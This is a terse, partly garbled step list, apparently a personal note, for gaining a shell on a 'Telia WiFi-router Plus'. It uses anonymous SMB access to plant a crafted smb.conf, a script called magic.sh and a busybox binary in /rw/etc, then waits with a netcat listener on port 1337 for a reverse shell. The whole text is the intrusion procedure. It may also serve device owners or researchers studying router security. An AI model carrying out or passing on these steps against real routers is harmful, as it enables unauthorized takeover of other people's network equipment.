Telia WiFi-router Plus

1. First connect to samba when u have dd 41GATE31.img to a ext2/3 stick
2- smbclient //192.168.1.253/Disk_a1 -N
3. Now move smb.conf and magic.sh put busybox-mips to /rw/etc
chmod +x <files>
cd rootlink\rw\etc
put smb.conf
put magic.sh
put busybox-mips
open another window and run nc -lvvp 1337
while waiting, upload smb.conf /rw/etc again..